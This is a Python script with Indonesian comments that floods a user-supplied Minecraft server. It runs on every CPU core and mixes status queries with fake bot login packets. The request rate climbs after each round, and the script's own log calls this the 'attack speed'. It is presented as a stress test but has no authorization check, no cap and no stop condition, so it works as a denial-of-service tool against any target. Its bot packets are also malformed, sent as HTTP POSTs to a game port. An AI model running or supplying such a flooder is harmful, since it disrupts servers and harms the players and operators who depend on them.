import asyncio
import logging
import random
import time
import aiohttp
from mcstatus import MinecraftServer
from multiprocessing import Process, cpu_count

# Setup logging untuk mencatat hasil ke dalam file log
logging.basicConfig(filename='server_status.log', level=logging.INFO, format='%(asctime)s - %(message)s')

async def send_status_request(server_address, server_port, retries=3, backoff_factor=1.5):
    try:
        server = MinecraftServer.lookup(f"{server_address}:{server_port}")
        start_time = time.time()
        status = await server.async_status()
        latency = (time.time() - start_time) * 1000  # Latency dalam milidetik

        result = f"Server online, {status.players.online} players. Latency: {latency:.2f} ms"
        logging.info(result)
        print(result)

    except Exception as e:
        if retries > 0:
            wait_time = random.uniform(1, 3) * backoff_factor
            await asyncio.sleep(wait_time)
            await send_status_request(server_address, server_port, retries - 1, backoff_factor * 1.5)
        else:
            logging.error(f"Request gagal: {e}")
            print(f"Request gagal: {e}")

async def send_bot_request(session, server_address, server_port):
    try:
        player_name = f"Bot_{random.randint(1000, 9999)}_{random.choice(['X', 'Z', 'A', 'Q', 'Y'])}"
        packet = f"\x00\x04\x00{player_name}"
        await session.post(f"http://{server_address}:{server_port}", data=packet)
        logging.info(f"Bot {player_name} sent successfully.")
        print(f"Bot {player_name} sent successfully.")

    except Exception as e:
        logging.error(f"Bot Login Error: {e}")
        print(f"Bot Login Error: {e}")

async def stress_test(server_address, server_port, process_id, num_requests, request_rate):
    tasks = []
    async with aiohttp.ClientSession() as session:
        for request_id in range(1, num_requests + 1):
            if random.random() < 0.6:
                tasks.append(asyncio.create_task(send_status_request(server_address, server_port)))
            else:
                tasks.append(asyncio.create_task(send_bot_request(session, server_address, server_port)))

            await asyncio.sleep(1 / request_rate)
        await asyncio.gather(*tasks)

def start_process(server_address, server_port, process_id, num_requests, request_rate):
    while True:
        asyncio.run(stress_test(server_address, server_port, process_id, num_requests, request_rate))

        recovery_time = random.uniform(5, 15)
        logging.info(f"Proses {process_id}: Pemulihan selama {recovery_time:.2f} detik")
        time.sleep(recovery_time)

        request_rate += random.randint(5, 10)
        logging.info(f"Proses {process_id}: Kecepatan serangan meningkat menjadi {request_rate} requests per detik")

if __name__ == "__main__":
    server_address = input("Masukkan alamat server Minecraft: ").strip()
    server_port = input("Masukkan port server Minecraft: ").strip()

    num_requests_per_process = 300
    request_rate = 50
    num_cores = cpu_count()

    processes = []
    for process_id in range(num_cores):
        process = Process(target=start_process, args=(server_address, server_port, process_id, num_requests_per_process, request_rate))
        process.start()
        processes.append(process)

    for process in processes:
        process.join()
